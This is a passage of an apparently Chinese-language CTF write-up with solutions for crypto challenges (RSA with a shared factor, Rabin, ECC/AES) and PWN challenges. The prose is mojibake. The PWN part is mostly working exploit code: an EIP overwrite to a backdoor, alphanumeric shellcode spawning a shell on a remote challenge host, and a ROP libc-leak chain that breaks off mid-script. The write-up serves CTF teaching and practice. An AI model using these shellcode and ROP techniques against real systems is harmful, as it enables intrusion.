class="string">"|"</span>))</span><br><span class="line">#<span class="built_in">print</span> sudoku</span><br><span class="line"></span><br><span class="line">def find_index(s):</span><br><span class="line">    flag=list()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        <span class="built_in">row</span>=[]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">            <span class="keyword">if</span> s[i][j]=='<span class="number">0</span>':</span><br><span class="line">                <span class="built_in">row</span>.<span class="built_in">append</span>(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">row</span>.<span class="built_in">append</span>(<span class="number">0</span>)</span><br><span class="line">        flag.<span class="built_in">append</span>(<span class="built_in">row</span>)</span><br><span class="line">    <span class="built_in">return</span> flag</span><br><span class="line">                </span><br><span class="line">                </span><br><span class="line">def not_done(s):</span><br><span class="line">    <span class="built_in">return</span> True <span class="keyword">in</span> [<span class="number">0</span> <span class="keyword">in</span> r <span class="keyword">for</span> r <span class="keyword">in</span> s]</span><br><span class="line"></span><br><span class="line">def get_row(s, r):</span><br><span class="line">    <span class="built_in">return</span> s[r]</span><br><span class="line"></span><br><span class="line">def get_column(s, c):</span><br><span class="line">    <span class="built_in">return</span> [r[c] <span class="keyword">for</span> r <span class="keyword">in</span> s]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_possible(s, r, c):</span><br><span class="line">    <span class="built_in">return</span> [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>) \</span><br><span class="line">                <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> get_row(s, r) \</span><br><span class="line">                <span class="keyword">and</span> i <span class="keyword">not</span> <span class="keyword">in</span> get_column(s, c)]</span><br><span class="line"></span><br><span class="line">def go_around(s):</span><br><span class="line">    ans = []</span><br><span class="line">    <span class="keyword">for</span> index_r, r <span class="keyword">in</span> enumerate(s): #row_index <span class="keyword">and</span> <span class="built_in">row</span></span><br><span class="line">        <span class="built_in">row</span> = []</span><br><span class="line">        <span class="keyword">for</span> index_c, c <span class="keyword">in</span> enumerate(r): #each <span class="keyword">in</span> <span class="built_in">row</span></span><br><span class="line">            c=int(c)</span><br><span class="line">            <span class="keyword">if</span> <span class="number">0</span> == c:</span><br><span class="line">                maybe_ans = get_possible(s, index_r, index_c)</span><br><span class="line">                <span class="built_in">row</span>.<span class="built_in">append</span>(maybe_ans[<span class="number">0</span>] <span class="keyword">if</span> len(maybe_ans) == <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">row</span>.<span class="built_in">append</span>(c)</span><br><span class="line">        ans.<span class="built_in">append</span>(<span class="built_in">row</span>)</span><br><span class="line">    <span class="built_in">return</span> ans</span><br><span class="line"></span><br><span class="line">def print_sudoku(s, msg):</span><br><span class="line">    <span class="built_in">print</span> msg</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> s:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">" "</span>.<span class="built_in">join</span>([str(c) <span class="keyword">for</span> c <span class="keyword">in</span> r])</span><br><span class="line">    <span class="built_in">print</span> <span class="string">"*"</span>*<span class="number">18</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">#print_sudoku(sudoku, <span class="string">"initializing..."</span>)</span><br><span class="line">FLAG=find_index(sudoku)</span><br><span class="line">counter=<span class="number">0</span></span><br><span class="line">sudoku = go_around(sudoku)</span><br><span class="line">#print_sudoku(sudoku, <span class="string">"Round "</span>+ str(counter) + <span class="string">" :"</span>)</span><br><span class="line">#counter += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> not_done(sudoku):</span><br><span class="line">    sudoku = go_around(sudoku)</span><br><span class="line">    #print_sudoku(sudoku, <span class="string">"Round "</span>+ str(counter) + <span class="string">" :"</span>)</span><br><span class="line">   # counter += <span class="number">1</span></span><br><span class="line">answer=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    <span class="keyword">if</span> FLAG[<span class="number">0</span>][i] == <span class="number">1</span>:</span><br><span class="line">        answer+=str(sudoku[<span class="number">0</span>][i])+<span class="string">","</span></span><br><span class="line">answer=answer[:-<span class="number">1</span>]</span><br><span class="line">sh.sendline(answer)</span><br><span class="line">#<span class="built_in">print</span> answer</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">    answer=<span class="string">""</span></span><br><span class="line">    sh.recvuntil(<span class="string">"answer :"</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        <span class="keyword">if</span> FLAG[i][j]==<span class="number">1</span>:</span><br><span class="line">           answer+=str(sudoku[i][j])+<span class="string">","</span></span><br><span class="line">    answer=answer[:-<span class="number">1</span>]</span><br><span class="line">    sh.sendline(answer)</span><br><span class="line">    #<span class="built_in">print</span> answer</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><a href="https://p0.ssl.qhimg.com/t01085b7d87603dfcf5.png" target="_blank" rel="noopener"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></a></p><p>å¾—åˆ°flagï¼šflag{b613e841e0822e2925376d5373cbfbc4}</p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="ä¸ä»…ä»…æ˜¯RSA"><a href="#ä¸ä»…ä»…æ˜¯RSA" class="headerlink" title="ä¸ä»…ä»…æ˜¯RSA"></a>ä¸ä»…ä»…æ˜¯RSA</h3><p>ä¸‹è½½é™„ä»¶å¾—åˆ°äº”ä¸ªæ–‡ä»¶ï¼Œ</p><p>ä¸¤ä¸ªéŸ³é¢‘æ–‡ä»¶ï¼Œçœ‹æ³¢å½¢å›¾ï¼Œæ˜¯æ‘©æ–¯å¯†ç ï¼Œè§£å¯†å¾—åˆ°c1,c2</p><p>ä¸¤ä¸ªpemæ–‡ä»¶ï¼Œç”¨opensshæ‰“å¼€å¾—åˆ°ä¸¤ä¸ªæ¨¡nå’Œç›¸åŒçš„e</p><p>æ ¹æ®åŠ å¯†è„šæœ¬å¾—çŸ¥ä¸¤ä¸ªnæœ‰å…¬çº¦æ•°</p><p>æ‰€ä»¥å·²çŸ¥e p q</p><p>åŸºç¡€rsaè§£å¯†ï¼Œ</p><p>expï¼š</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">from gmpy2 import *</span><br><span class="line"></span><br><span class="line">def GCD(a, b):</span><br><span class="line"></span><br><span class="line">    while b:</span><br><span class="line">        a, b = b, a%b</span><br><span class="line">    return a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c1=4314251881242803343641258350847424240197348270934376293792054938860756265727535163218661012756264314717591117355736219880127534927494986120542485721347351</span><br><span class="line">c2=485162209351525800948941613977942416744737316759516157292410960531475083863663017229882430859161458909478412418639172249660818299099618143918080867132349</span><br><span class="line"></span><br><span class="line">e=mpz(41221)</span><br><span class="line"></span><br><span class="line">n1=int('0xC461B3ED566F2D68583019170BDD5263D113BAECE3DEE6631F08A166376AC41FF5D4E90B3330E0FC26993E3B353F38F9B6B880DFBC5807636497561B7611047B',16)</span><br><span class="line"></span><br><span class="line">n2=int('0xA36E3A2A83FE2C1E33F285A08C3ECD36E377F4D9FFE828E2426D3ECED0A7F947631E932AEC327555511AC6D71E72686C1CB7DBBF3859A4D9A3D344FBF12A9553',16)</span><br><span class="line"></span><br><span class="line"><span class="comment">#q=GCD(n1,n2)</span></span><br><span class="line">q = mpz(95652716952085928904432251307911783641637100214166105912784767390061832540987)</span><br><span class="line">print n2/q</span><br><span class="line">p1 = mpz(107527961531806336468215094056447603422487078704170855072884726273308088647617)</span><br><span class="line">p2 = mpz(89485735722023752007114986095340626130070550475022132484632643785292683293897)</span><br><span class="line">assert p1*q==n1</span><br><span class="line">assert p2*q==n2</span><br><span class="line">d1 = invert(e,(p1-1)*(q-1))</span><br><span class="line">d2 = invert(e,(p2-1)*(q-1))</span><br><span class="line"></span><br><span class="line">m1 = hex(pow(c1,d1,n1))[2:].decode('hex')</span><br><span class="line">m2 = hex(pow(c2,d2,n2))[2:].decode('hex')</span><br><span class="line">print m1,m2</span><br></pre></td></tr></table></figure><p>flagï¼šUNCTF{ac01dff95336aa470e3b55d3fe43e9f6}</p><h3 id="ä¸€å¥è¯åŠ å¯†"><a href="#ä¸€å¥è¯åŠ å¯†" class="headerlink" title="ä¸€å¥è¯åŠ å¯†"></a>ä¸€å¥è¯åŠ å¯†</h3><p>æ‹¿åˆ°æ–‡ä»¶ï¼Œpythonæ–‡ä»¶é‡Œæ²¡æœ‰å•¥ï¼Œæ­£å¸¸çš„rsaåŠ å¯†ï¼Œ</p><p>ç„¶åç”¨010editoræ‰“å¼€å¦å¤–ä¸€å¼ å›¾ç‰‡ï¼Œå‘ç°åº•ä¸‹æœ‰å†…å®¹</p><p><a href="https://p4.ssl.qhimg.com/t016ad124e2ec4f7898.png" target="_blank" rel="noopener"><img src="https://p4.ssl.qhimg.com/t016ad124e2ec4f7898.png" alt="img"></a></p><p>çŒœæµ‹é‚£ä¸ªå¤§æ•°æ˜¯nï¼Œå…ˆæ‹¿å»åˆ†è§£ä¸€æ³¢ï¼Œå‘ç°å¯è¡Œ</p><p><a href="https://p0.ssl.qhimg.com/t01ecb1e951aebdcb5a.png" target="_blank" rel="noopener"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></a></p><p>ä½†æ˜¯ï¼Œeå‘¢ï¼Ÿ</p><p>çªç„¶ï¼Œå‘ç°è¢«åˆ†è§£å‡ºæ¥çš„på’Œqå¾ˆç†Ÿæ‚‰</p><p>ä¸Š<a href="https://veritas501.space/2017/03/01/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">Vçˆ·çˆ·åšå®¢</a>!</p><p>pã€qå‡ºç°åœ¨Vçˆ·çˆ·çš„Rabinå¯†ç çš„è„šæœ¬é‡Œï¼Œé‚£ä¹ˆè¿™é¢˜å°±æ˜¯Rabinå¯†ç äº†ï¼Œï¼Œ</p><p>é‚£ä¹ˆç›´æ¥ä¸ŠVçˆ·çˆ·è„šæœ¬</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line"></span><br><span class="line">def n2s(num):</span><br><span class="line">    t = hex(num)[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">if</span> len(t) % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">       <span class="keyword">return</span> (<span class="string">'0'</span>+t).decode(<span class="string">'hex'</span>)</span><br><span class="line">    <span class="keyword">return</span> t.decode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line">def decode(c):</span><br><span class="line">    p = <span class="number">275127860351348928173285174381581152299</span></span><br><span class="line">    q = <span class="number">319576316814478949870590164193048041239</span></span><br><span class="line">    n = p*q</span><br><span class="line">    r = <span class="keyword">pow</span>(c,(p+<span class="number">1</span>)/<span class="number">4</span>,p)</span><br><span class="line">    s = <span class="keyword">pow</span>(c,(q+<span class="number">1</span>)/<span class="number">4</span>,q)</span><br><span class="line">    a = gmpy2.invert(p,q)</span><br><span class="line">    b = gmpy2.invert(q,p)</span><br><span class="line">    x =(a*p*s+b*q*r)%n</span><br><span class="line">    y =(a*p*s-b*q*r)%n</span><br><span class="line">    <span class="keyword">print</span> n2s(x%n)</span><br><span class="line">    <span class="keyword">print</span> n2s((-x)%n)</span><br><span class="line">    <span class="keyword">print</span> n2s(y%n)</span><br><span class="line">    <span class="keyword">print</span> n2s((-y)%n)</span><br><span class="line"></span><br><span class="line">c1=<span class="number">62501276588435548378091741866858001847904773180843384150570636252430662080263</span></span><br><span class="line"></span><br><span class="line">c2=<span class="number">72510845991687063707663748783701000040760576923237697638580153046559809128516</span></span><br><span class="line"></span><br><span class="line">decode(c1)</span><br><span class="line">decode(c2)</span><br></pre></td></tr></table></figure><p><a href="https://p4.ssl.qhimg.com/t01ddf73d4040ed8c6f.png" target="_blank" rel="noopener"><img src="https://p4.ssl.qhimg.com/t01ddf73d4040ed8c6f.png" alt="img"></a></p><p>è¿è¡Œå¾—åˆ°flagï¼šunctf{412a1ed6d21e55191ee5131f266f5178}</p><h3 id="ECCå’ŒAESåŸºç¡€"><a href="#ECCå’ŒAESåŸºç¡€" class="headerlink" title="ECCå’ŒAESåŸºç¡€"></a>ECCå’ŒAESåŸºç¡€</h3><p>å‚è€ƒ<a href="https://ctf-wiki.github.io/ctf-wiki/crypto/asymmetric/discrete-log/ecc-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/crypto/asymmetric/discrete-log/ecc-zh/</a></p><p>å°†åº•ä¸‹çš„è„šæœ¬çš„æ•°æ®æ›¿æ¢ä¸‹</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">G</span>=E(6478678675, 5636379357093)</span><br><span class="line">pub = E(2854873820564,9226233541419)</span><br><span class="line"></span><br><span class="line">c1 = E(6860981508506,1381088636252)</span><br><span class="line">c2 = E(1935961385155, 8353060610242)</span><br><span class="line"></span><br><span class="line">X = G</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(1, 3000000):</span><br><span class="line">    <span class="keyword">if</span> X == pub:</span><br><span class="line">       <span class="built_in"> secret </span>= i</span><br><span class="line">        <span class="builtin-name">print</span> <span class="string">"[+] secret:"</span>, i</span><br><span class="line">        break</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        X = X + G</span><br><span class="line">        <span class="builtin-name">print</span> i</span><br><span class="line"></span><br><span class="line">m = c2 - (c1 * secret)</span><br><span class="line"></span><br><span class="line"><span class="builtin-name">print</span> <span class="string">"[+] x:"</span>, m[0]</span><br><span class="line"><span class="builtin-name">print</span> <span class="string">"[+] y:"</span>, m[1]</span><br><span class="line"><span class="builtin-name">print</span> <span class="string">"[+] x+y:"</span>, m[0] + m[1]</span><br></pre></td></tr></table></figure><p>çˆ†ç ´å¾—åˆ°secret=2019813</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">x</span>=1559343440829</span><br><span class="line"> <span class="attribute">y</span>=7468915163961</span><br></pre></td></tr></table></figure><p>xå³ä¸ºaes_key</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">from</span> <span class="type">Crypto</span>.<span class="type">Cipher</span> <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title">key</span> = bytes('<span class="number">1559343440829</span>'.ljust(<span class="number">16</span>,' '))</span><br><span class="line"><span class="title">aes</span> = <span class="type">AES</span>.new(key, <span class="type">AES</span>.<span class="type">MODE_ECB</span>)  </span><br><span class="line"><span class="class"><span class="keyword">data</span>=base64.b64decode('/<span class="title">cM8Nx</span>+<span class="title">iAidmt6RiqX8Vww</span>==')</span></span><br><span class="line"><span class="title">ans</span> = aes.decrypt(<span class="class"><span class="keyword">data</span>)</span></span><br><span class="line"><span class="title">print</span> ans</span><br></pre></td></tr></table></figure><p>å‘ç°å¹¶ä¸èƒ½è§£å‡ºæ¥</p><p>è¿™é‡Œæœ‰ç‚¹å°å‘ï¼ŒC1å’ŒC2ä½ç½®äº’æ¢äº†</p><p>äºæ˜¯é‡æ–°è·‘ç¬¬ä¸€ä¸ªè„šæœ¬ï¼ŒC1å’ŒC2çš„å€¼äº’æ¢ï¼Œsecretä¹‹å‰å·²ç»çˆ†ç ´å‡ºæ¥äº†</p><p>å¾—åˆ° x=1026</p><p>AESè§£å¯†å¾—</p><p>thisisa_flag</p><p>ç„¶åå»ç›®æ ‡url post</p><p>å¾—åˆ°</p><p><a href="https://p0.ssl.qhimg.com/t017274e33bae69e881.png" target="_blank" rel="noopener"><img src="https://p0.ssl.qhimg.com/t017274e33bae69e881.png" alt="img"></a></p><p>flagï¼š401E48C9A96DC219C32AB5E75204B655</p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="Sosoeasypwn"><a href="#Sosoeasypwn" class="headerlink" title="Sosoeasypwn"></a>Sosoeasypwn</h3><p>åŸæœ¬æƒ³æ³„éœ²canaryï¼Œåæ— æ„é—´å‘ç°ï¼Œeipç«Ÿç„¶è¢«è¦†ç›–äº†ï¼Œäºæ˜¯æ‰‹æµ‹ï¼Œå‘ç°è¾“å…¥12ä¸ªaåå³å¯æ§åˆ¶eipã€‚ï¼ˆè¿™é‡Œè¾“å…¥äº†12ä¸ªaå’Œ3ä¸ªbåŠ 1ä¸ªå›è½¦ï¼Œå¯è§eipè¢«è¦†ç›–æˆäº†bbb\nï¼‰</p><p><a href="https://p4.ssl.qhimg.com/t010c37e6c8bbb1b6b1.png" target="_blank" rel="noopener"><img src="https://p4.ssl.qhimg.com/t010c37e6c8bbb1b6b1.png" alt="img"></a></p><p>IDAé™æ€åˆ†æå‘ç°ï¼Œæ˜¯ä¸¤ä¸ªå‡½æ•°è°ƒç”¨äº†åŒä¸€ä¸ªæ ˆï¼Œç„¶åæ ˆå†…æ•°æ®æ²¡æ¸…ç†ï¼Œå¯¼è‡´éƒ¨åˆ†æ•°æ®è¢«é‡ç”¨</p><p><a href="https://p4.ssl.qhimg.com/t015e095d24737ad464.png" target="_blank" rel="noopener"><img src="https://p4.ssl.qhimg.com/t015e095d24737ad464.png" alt="img"></a></p><p>æ‰€ä»¥å¯¼è‡´åˆæ³•è¾“å…¥å°±å¯ä»¥è¦†ç›–v1çš„å€¼ã€‚</p><p>ç”±äºå¼€å¯äº†eipä¿æŠ¤ï¼Œä½†ç¨‹åºæœ¬èº«å·²ç»ç»™äº†16ä½ï¼ˆ4ä¸ªå­—ç¬¦ï¼‰ï¼Œidaé‡Œå¯ä»¥çœ‹åˆ°åé—¨å‡½æ•°çš„ç›¸å¯¹åç§»ï¼Œ9CD</p><p><a href="https://p3.ssl.qhimg.com/t018a621e2f9cea22b6.png" target="_blank" rel="noopener"><img src="https://p3.ssl.qhimg.com/t018a621e2f9cea22b6.png" alt="img"></a></p><p><a href="https://p4.ssl.qhimg.com/t0196029343f5794798.png" target="_blank" rel="noopener"><img src="https://p4.ssl.qhimg.com/t0196029343f5794798.png" alt="img"></a></p><p>åŸºå€å12ä½ï¼ˆ3ä¸ªå­—ç¬¦ï¼‰éƒ½æ˜¯0ï¼Œé‚£ä¹ˆä»…éœ€è¦çˆ†ç ´ä¸€ä¸ªå­—ç¬¦å³å¯å¾—åˆ°æ‹¿åˆ°shell</p><p>expï¼š</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/<span class="keyword">python</span></span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">                </span><br><span class="line">                #sh = remote(<span class="string">'101.71.29.5'</span>,<span class="number">10000</span>)</span><br><span class="line">                <span class="keyword">sh</span> = process(<span class="string">"./pwn"</span>)</span><br><span class="line">              base_addr = <span class="keyword">sh</span>.recvuntil(<span class="string">' world'</span>)</span><br><span class="line">              base_addr = hex(<span class="keyword">int</span>(base_addr[-<span class="number">11</span>:-<span class="number">6</span>]))</span><br><span class="line">              <span class="keyword">sh</span>.recvuntil(<span class="string">'So, Can you tell me your name?'</span>)</span><br><span class="line">              <span class="keyword">sh</span>.send(<span class="string">'a'</span>*<span class="number">12</span>+p32(<span class="keyword">int</span>(base_addr+<span class="string">'89cd'</span>,<span class="number">16</span>))</span><br><span class="line">              <span class="keyword">sh</span>.recvuntil(<span class="string">'Please'</span>)</span><br><span class="line">              <span class="keyword">sh</span>.sendline(<span class="string">'ls'</span>)</span><br><span class="line">              <span class="keyword">sh</span>.interactive()</span><br><span class="line"></span><br><span class="line">       except Exception <span class="keyword">as</span> <span class="keyword">e</span>:</span><br><span class="line">                <span class="keyword">sh</span>.<span class="keyword">close</span>()</span><br></pre></td></tr></table></figure><p><a href="https://p3.ssl.qhimg.com/t01c1ca90119886610c.png" target="_blank" rel="noopener"><img src="https://p3.ssl.qhimg.com/t01c1ca90119886610c.png" alt="img"></a></p><p>å¾—åˆ°flagï¼šUNCTF{S0soE4zy_Pwn}</p><h3 id="EasyShellcode"><a href="#EasyShellcode" class="headerlink" title="EasyShellcode"></a>EasyShellcode</h3><p>åæ±‡ç¼–çœ‹ç¨‹åºé€»è¾‘ï¼Œå°±åªæ˜¯é™åˆ¶äº†shellcodeçš„å­—ç¬¦ï¼Œè¦æ±‚åœ¨A-Za-z0-9ä¹‹é—´</p><p>ç›´æ¥ä¸ŠVçˆ·çˆ·å°†shellcodeè½¬base64çš„å·¥å…·</p><p><a href="https://github.com/veritas501/ae64" target="_blank" rel="noopener">https://github.com/veritas501/ae64</a></p><p>expï¼š</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">'101.71.29.5'</span>,<span class="number">10080</span>)</span><br><span class="line">p.recvuntil(<span class="string">'say?\n'</span>)</span><br><span class="line">obj = AE64()</span><br><span class="line">sc = obj.encode(asm(shellcraft.sh()))</span><br><span class="line">p.sendline(sc)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><a href="https://p5.ssl.qhimg.com/t0179595b6b28cd5641.png" target="_blank" rel="noopener"><img src="https://p5.ssl.qhimg.com/t0179595b6b28cd5641.png" alt="img"></a></p><p>flagï¼šUNCTF{x64A5c11shE11c0dEi550_Ea5y}</p><h3 id="easy-rop"><a href="#easy-rop" class="headerlink" title="easy rop"></a>easy rop</h3><p><a href="https://p2.ssl.qhimg.com/t01759f7cce9c0eaea9.png" target="_blank" rel="noopener"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></a></p><p>è¿™ä¸ªå¾ˆå¥½ç»•è¿‡</p><p><a href="https://p3.ssl.qhimg.com/t013871b803b0d0c557.png" target="_blank" rel="noopener"><img src="https://p3.ssl.qhimg.com/t013871b803b0d0c557.png" alt="img"></a></p><p>å‘ç°æœ‰ä¸€ä¸ªæ ˆæº¢å‡ºï¼Œè€Œä¸”retaddråšäº†é™åˆ¶ï¼Œè¿™æ ·å°±ä¸èƒ½ç›´æ¥retåˆ°systemäº†ï¼ˆè¿™é‡Œæˆ‘ç”¨çš„æ˜¯one_gadgetï¼‰ï¼Œä½†æ˜¯å¯ä»¥æ‰¾gadgetç»•è¿‡ï¼ˆè¿™é‡Œæˆ‘æ‰¾çš„æ˜¯ ret ï¼‰</p><p>å…¶ä¸­libcç‰ˆæœ¬ç”¨LibcSearcheræ³„éœ²å‡ºæ¥ï¼Œç„¶åpayloadçš„åç§»éœ€è¦ç”¨â€™\x00â€™æ¥å¡«å……ï¼Œä»¥æ»¡è¶³one_gadgetçš„æ¡ä»¶ã€‚</p><p><a href="https://p3.ssl.qhimg.com/t01ce2f71ec4f2627f1.png" target="_blank" rel="noopener"><img src="https://p3.ssl.qhimg.com/t01ce2f71ec4f2627f1.png" alt="img"></a></p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#sh = process('./babyrop')</span></span><br><span class="line">sh = remote(<span class="string">'101.71.29.5'</span>,<span class="number">10041</span>)</span><br><span class="line">elf = ELF(<span class="string">'./babyrop'</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">main_addr = <span class="number">0x08048592</span></span><br><span class="line">ret = <span class="number">0x0804839e</span></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'Hello CTFer!'</span>)</span><br><span class="line">payload = <span class="string">'\x00'</span>*<span class="number">0x20</span> + p32(<span class="number">0x66666666</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">'name?\n'</span>)</span><br><span class="line">payload = <span class="string">'\x00'</span>*<span class="number">0x14</span>  + p32(puts_plt) + p32(main_addr) + p32(puts_got)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">addr = u32(sh.recvuntil(<span 